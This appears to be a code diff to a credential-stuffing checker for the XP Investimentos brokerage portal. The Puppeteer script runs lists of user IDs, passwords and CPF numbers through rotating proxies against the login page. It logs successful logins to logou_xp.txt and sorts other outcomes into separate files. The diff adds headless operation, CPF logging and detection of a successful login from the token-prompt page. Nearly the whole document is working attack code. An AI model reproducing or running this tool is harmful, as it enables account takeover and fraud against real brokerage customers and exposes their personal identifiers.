@@ -76,7 +76,7 @@ async function detectxp(linha, randomProxy){
 	
 }
 
- async function linhachecker(linha, randomProxy){
+ async function linhachecker(linha, randomProxy, cpf){
 		
 		 const dividirlinha = linha.split('|');
 		 let iduser = dividirlinha[0]
@@ -89,7 +89,7 @@ async function detectxp(linha, randomProxy){
 	  
            {
 			    
-			   headless: false,
+			   headless: true,
 			   product: 'chrome',
 			  executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
 			  ignoreHTTPSErrors: true,
@@ -180,8 +180,8 @@ async function detectxp(linha, randomProxy){
 		try{
       await page.goto('https://portal.xpi.com.br/default.aspx' , {timeout:30000, waitUntil: 'networkidle2' });
 		}catch(error){
-			 console.log(chalk.bgRed.black(`ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/connection_error.txt', `ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+			 console.log(chalk.bgRed.black(`ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/connection_error.txt', `ERRO DE CONEXAO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'wait-error'
 		}
@@ -194,8 +194,8 @@ async function detectxp(linha, randomProxy){
 	  	 try{
 			  	  await page.waitForNavigation({waitUntil: 'networkidle2' })
 		} catch(error){
-			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/wait_pass_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/wait_pass_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE INSERIR SENHA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'wait-error'
 		}
@@ -244,19 +244,19 @@ async function verificarElementoOuTexto(page, browser) {
   var verificar1 = await verificarElementoOuTexto(page, browser)
   
   if(verificar1.includes('unknown1')){
-		console.log(chalk.bgRed.black(`ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/UNKNOWN1.txt', `ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+		console.log(chalk.bgRed.black(`ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} `));
+		fs.appendFile('./Resultados/UNKNOWN1.txt', `ERRO DESCONHECIDO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'unknown1'
   }
   else if(verificar1.includes('conta-bloqueada')){
-	    console.log(chalk.bgRed.black(`CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/account_bloqued.txt', `CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+	    console.log(chalk.bgRed.black(`CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} `));
+		fs.appendFile('./Resultados/account_bloqued.txt', `CONTA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}  \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'conta-bloqueada'
   } else if(verificar1.includes('nascimento')){
-	    console.log(chalk.bgRed.black(`PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/pediu_nascimento.txt', `PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+	    console.log(chalk.bgRed.black(`PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} `));
+		fs.appendFile('./Resultados/pediu_nascimento.txt', `PEDIU NASCIMENTO -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'nascimento'
   }
@@ -286,8 +286,8 @@ await page.waitForTimeout(4000)
 			await page.click('input[id="btnEntrar"]');
 			  	  await page.waitForNavigation({waitUntil: 'networkidle2' })
 		} catch(error){
-			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/wait_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+			 console.log(chalk.bgRed.black(`ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/wait_error.txt', `ERRO AO AGUARDAR CARREGAMENTO DE LOGIN -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'wait-error'
 		}
@@ -300,13 +300,17 @@ await page.waitForTimeout(4000)
     const elemento = await page.$('a[id="btnPass4"]');
     const texto = await page.$x(`//*[contains(text(), 'A senha digitada está errada')]`);
     const texto2 = await page.$x(`//*[contains(text(), 'Você excedeu o n')]`);
+    const texto3 = await page.$x(`//*[contains(text(), 'Digite seu XP Token')]`);
 
     try {
      // if (elemento) {
 	//	  return 'found1'
      //   //
      // } else 
-		 if (texto.length > 0) {
+		 if (texto3.length > 0) {
+		return 'logou'
+      } 
+	  else if (texto.length > 0) {
 		return 'senha-incorreta'
       } 
 	else if (texto2.length > 0) {
@@ -332,21 +336,27 @@ await page.waitForTimeout(4000)
 }
   var verificar2 = await verificarElementoOuTexto2(page, browser)
   
-  if(verificar2.includes('senha-incorreta')){
-		console.log(chalk.bgRed.black(`SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/senha-incorreta.txt', `SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+  if(verificar2.includes('logou')){
+		console.log(chalk.bgRed.black(`LOGOU -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/logou_xp.txt', `LOGOU -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
+		await browser.close()
+		return 'logou'
+  } 
+  else if(verificar2.includes('senha-incorreta')){
+		console.log(chalk.bgRed.black(`SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/senha-incorreta.txt', `SENHA INCORRETA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'senha-incorreta'
   }
   else if(verificar2.includes('senha-bloqueada')){
-		console.log(chalk.bgRed.black(`SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/senha-bloqueada.txt', `SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+		console.log(chalk.bgRed.black(`SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/senha-bloqueada.txt', `SENHA BLOQUEADA -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'senha-bloqueada'
   }
   else if(verificar2.includes('unknown2')){
-	    console.log(chalk.bgRed.black(`UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha}`));
-		fs.appendFile('./Resultados/unknown_login.txt', `UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
+	    console.log(chalk.bgRed.black(`UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf}`));
+		fs.appendFile('./Resultados/unknown_login.txt', `UNKNOWN LOGIN ERROR -> ID: ${iduser} - SENHA: ${senha} - CPF ${cpf} \n`, function (err) { if (err) throw err;  });
 		await browser.close()
 		return 'unknown2'
   }
@@ -362,7 +372,12 @@ await page.waitForTimeout(4000)
 	
 // FUNÇÃO DE TESTAR.
 // função que executa as funções assíncronas em paralelo
-async function runAsyncFunctions(lines, concurrency, diretorioproxy) {
+async function testar(diretorio, concurrency, diretoroproxy) {
+	
+  const dataProxy = fs.readFileSync(diretoroproxy, 'utf-8');
+  const data = fs.readFileSync(diretorio, 'utf-8');
+  //const dataProxy = fs.readFileSync(diretorioproxy, 'utf-8');
+  const lines = data.split('\n').map((line) => line.trim()).filter((line) => line.length > 0);
 
   const running = [];
 
@@ -378,7 +393,7 @@ async function runAsyncFunctions(lines, concurrency, diretorioproxy) {
 	   const p1 = async function() {
       console.log(`Starting line ${i + 1}`);
 	  console.log(`${lines[i]}`)
-      await iniciar(`${lines[i]}`, diretorioproxy)
+      await iniciar(`${lines[i]}`, dataProxy)
     }();
 	
 	    
@@ -393,26 +408,18 @@ async function runAsyncFunctions(lines, concurrency, diretorioproxy) {
   }
 }
 
-// lê o arquivo de texto linha por linha e chama a função de execução das funções assíncronas
-async function testar(diretorio, thread, diretorioproxy) {
-  const data = fs.readFileSync(diretorio, 'utf-8');
-  const dataProxy = fs.readFileSync(diretorioproxy, 'utf-8');
-  const lines = data.split('\n').map((line) => line.trim()).filter((line) => line.length > 0);
-
-  const batchSize = thread;
-  const batches = [];
-  for (let i = 0; i < lines.length; i += batchSize) {
-    batches.push(lines.slice(i, i + batchSize));
-  }
-
-  for (const batch of batches) {
-    const promises = batch.map((line) => iniciar(line, dataProxy));
-    await Promise.all(promises);
+async function rodarComTempoLimite(email,senha,porta) {
+  const tempoLimite = 120000; // 120 segundos
+  try {
+   const resultado =  await Promise.race([testarinter(email,senha,porta), definirTempoLimite(tempoLimite)]);
+   return resultado
+  } catch (e) {
+    //console.log(e.message);
+	    throw e; // relança a exceção para que possa ser tratada pelo código que chamou a função
   }
 }
-
 async function iniciar(line, diretorioproxy){
-	  return new Promise(async (resolve) => {
+	  
     const linesp = diretorioproxy.split('\n');
     const randomIndex = Math.floor(Math.random() * linesp.length);
     const randomProxy = linesp[randomIndex];
@@ -445,8 +452,8 @@ async function iniciar(line, diretorioproxy){
 		 let linhatransformada = iduser + '|' + senha
 		 console.log(chalk.bgGreen.white(`DETECT -> ID: ${iduser} - SENHA: ${senha}`));
 		fs.appendFile('./Resultados/detect.txt', `DETECT -> ID: ${iduser} - SENHA: ${senha} \n`, function (err) { if (err) throw err;  });
-	     await linhachecker(linhatransformada, randomProxy);
-		resolve();
+	     await linhachecker(linhatransformada, randomProxy, cpf);
+		return 'ok'
 	}
 		else {
 	    console.log(chalk.bgRed.black(`ERRO DESCONHECIDO FUNCTION DETECT -> ID: ${cpf} - SENHA: ${senha} `));
@@ -456,8 +463,6 @@ async function iniciar(line, diretorioproxy){
   
 	
 	
-   
-  });
 }
 
 	  const rl = readline.createInterface({ input: process.stdin, output: process.stdout});	
